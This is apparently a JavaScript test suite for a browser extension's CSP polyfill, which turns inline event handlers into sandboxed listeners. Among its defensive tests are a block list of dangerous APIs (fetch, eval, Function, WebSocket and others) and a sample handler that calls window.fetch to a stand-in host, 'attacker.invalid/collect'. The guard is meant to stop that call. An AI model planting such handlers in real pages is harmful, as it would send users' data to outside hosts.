// Real full CSP IIFE installed on a private Element facade over detached DOM.
// No native page prototype is patched. Its captured listeners run the real interpreter.
async function cspFixture() {
    var inert=new DOMParser().parseFromString('<html><body></body></html>','text/html'),cache=new WeakMap(),warnings=[],calls=[];
    function ElementFacade(node){this.node=node||inert.createElement('div');cache.set(this.node,this);}
    function wrap(node){return node?(cache.get(node)||new ElementFacade(node)):null;}
    Object.defineProperties(ElementFacade.prototype,{
        innerHTML:{configurable:true,get:function(){return this.node.innerHTML;},set:function(v){this.node.innerHTML=v;}},
        outerHTML:{configurable:true,get:function(){return this.node.outerHTML;},set:function(v){this.node.outerHTML=v;}},
        attributes:{get:function(){return this.node.attributes;}},
        parentNode:{get:function(){return wrap(this.node.parentNode);}},parentElement:{get:function(){return wrap(this.node.parentElement);}},
        previousSibling:{get:function(){return wrap(this.node.previousSibling);}},nextSibling:{get:function(){return wrap(this.node.nextSibling);}},
        firstChild:{get:function(){return wrap(this.node.firstChild);}},nodeType:{get:function(){return this.node.nodeType;}}
    });
    ElementFacade.prototype.querySelectorAll=function(s){return Array.from(this.node.querySelectorAll(s)).map(wrap);};
    ElementFacade.prototype.setAttribute=function(n,v){this.node.setAttribute(n,v);};
    ElementFacade.prototype.removeAttribute=function(n){this.node.removeAttribute(n);};
    ElementFacade.prototype.insertAdjacentHTML=function(p,h){this.node.insertAdjacentHTML(p,h);};
    ElementFacade.prototype.addEventListener=function(type,fn){if(!this.listeners)this.listeners={};(this.listeners[type]||(this.listeners[type]=[])).push(fn);};
    ElementFacade.prototype.fire=function(type,event){(this.listeners&&this.listeners[type]||[]).forEach(function(fn){fn.call(this,event||{});},this);};
    var timers=[],w={};w.window=w;w.capture=function(){calls.push({receiver:this,args:Array.from(arguments)});};
    var m=await loadModules(['src/platform/extension/csp-polyfill.js'],{globals:{Element:ElementFacade,window:w,document:{getElementById:function(id){return wrap(inert.getElementById(id));}},console:{warn:function(){warnings.push(Array.from(arguments));}},setTimeout:function(fn,ms){timers.push({fn:fn,ms:ms});return timers.length;}}});
    return {Element:ElementFacade,wrap:wrap,doc:inert,window:w,warnings:warnings,calls:calls,timers:timers,m:m};
}
describe('CSP polyfill intercepted DOM behavior',function(){
    test('innerHTML converts and binds inline handler without retaining executable attributes',async function(){
        var f=await cspFixture(),root=new f.Element();root.innerHTML='<button onclick="capture(\'A&amp;B\')">Run</button>';var button=root.querySelectorAll('button')[0];
        assert.strictEqual(button.node.hasAttribute('onclick'),false);assert.strictEqual(button.node.hasAttribute('data-_ev-click'),false);button.fire('click');assert.deepStrictEqual(f.calls[0].args,['A&B']);assert.strictEqual(f.calls[0].receiver,button);assert.deepStrictEqual(f.m.__unstubbed,[]);
    });
    test('outerHTML replacement binds only new sibling span',async function(){
        var f=await cspFixture(),root=new f.Element();root.innerHTML='<button onclick="capture(\'old\')">Old</button><i>Boundary</i>';var old=root.querySelectorAll('button')[0];
        old.outerHTML='<button onclick="capture(\'new\')">New</button><button onclick="capture(\'second\')">Second</button>';
        var buttons=root.querySelectorAll('button');buttons.forEach(function(b){b.fire('click');});assert.deepStrictEqual(f.calls.map(function(c){return c.args[0];}),['new','second']);assert.strictEqual(buttons[0].node.hasAttribute('onclick'),false);
    });
    test('insertAdjacentHTML covers inside and outside insertions without duplicate listeners',async function(){
        var f=await cspFixture(),root=new f.Element();root.innerHTML='<button onclick="capture(\'existing\')">E</button>';root.insertAdjacentHTML('beforeend','<button onclick="capture(\'inside\')">I</button>');var first=root.querySelectorAll('button')[0];first.insertAdjacentHTML('afterend','<button onclick="capture(\'outside\')">O</button>');
        root.querySelectorAll('button').forEach(function(b){b.fire('click');});assert.deepStrictEqual(f.calls.map(function(c){return c.args[0];}),['existing','outside','inside']);
    });
    test('setAttribute routes handlers through listener and preserves ordinary attributes',async function(){
        var f=await cspFixture(),el=new f.Element();el.setAttribute('title','A&B');el.setAttribute('onclick','capture(this,event,true,false,null,undefined,3.5)');var ev={key:'X'};el.fire('click',ev);
        assert.strictEqual(el.node.getAttribute('title'),'A&B');assert.strictEqual(el.node.hasAttribute('onclick'),false);assert.deepStrictEqual(f.calls[0].args,[el,ev,true,false,null,undefined,3.5]);
    });
    test('quoted commas, semicolons and escape sequences survive interpreter arguments',async function(){
        var f=await cspFixture(),el=new f.Element();el.setAttribute('onclick',String.raw`capture('a,b;c','line\nnext','literal\\n','\x3ctag\x3e\x26\x22')`);el.fire('click');
        assert.deepStrictEqual(f.calls[0].args,['a,b;c','line\nnext','literal\\n','<tag>&"']);
    });
    test('event conditions, propagation controls and element assignment take real branches',async function(){
        var f=await cspFixture(),el=new f.Element(),stopped=0,prevented=0;el.value='old';el.setAttribute('onkeydown',"if(event.key==='Enter'||event.key==='Escape')capture(this.value);event.stopPropagation();event.preventDefault();this.value = ''");
        el.fire('keydown',{key:'Tab',stopPropagation:function(){stopped++;},preventDefault:function(){prevented++;}});assert.strictEqual(f.calls.length,0);assert.strictEqual(el.value,'');
        el.value='new';el.fire('keydown',{key:'Enter',stopPropagation:function(){stopped++;},preventDefault:function(){prevented++;}});assert.deepStrictEqual(f.calls[0].args,['new']);assert.strictEqual(stopped,2);assert.strictEqual(prevented,2);
    });
    test('delayed interpreter executes only when captured timer runs',async function(){var f=await cspFixture(),el=new f.Element();el.setAttribute('onclick',"setTimeout(function(){capture('later')}, 25)");el.fire('click');assert.strictEqual(f.calls.length,0);assert.strictEqual(f.timers[0].ms,25);f.timers[0].fn();assert.deepStrictEqual(f.calls[0].args,['later']);});
    test('direct dangerous APIs and prototype-path calls are blocked before lookup',async function(){
        var f=await cspFixture(),el=new f.Element(),effects=[];['fetch','eval','Function','XMLHttpRequest','WebSocket','Worker','chrome'].forEach(function(name){f.window[name]=function(){effects.push(name);};});
        el.setAttribute('onclick',"fetch('x');eval('x');Function('x');XMLHttpRequest();WebSocket('x');Worker('x');chrome();capture.constructor('x')");el.fire('click');assert.deepStrictEqual(effects,[]);assert.strictEqual(f.calls.length,0);assert.strictEqual(f.warnings.length,8);
    });
    test('unresolved and throwing handlers warn instead of escaping the event listener',async function(){var f=await cspFixture(),el=new f.Element();f.window.boom=function(){throw new Error('fixture failure');};el.setAttribute('onclick','missing();boom()');el.fire('click');assert.strictEqual(f.warnings.length,2);assert.match(f.warnings[0].join(' '),/Function not found: missing/);assert.match(f.warnings[1].join(' '),/Handler error: fixture failure/);});
    test('window-qualified network call must not bypass dangerous API blocklist',async function(){
        var f=await cspFixture(),root=new f.Element(),requests=[];f.window.fetch=function(url){requests.push(url);};
        root.innerHTML='<button onclick="window.fetch(\'https://attacker.invalid/collect\')">Untrusted</button>';root.querySelectorAll('button')[0].fire('click');
        assert.deepStrictEqual(requests,[],'the documented dangerous-API guard must also protect window.fetch');
    });
});
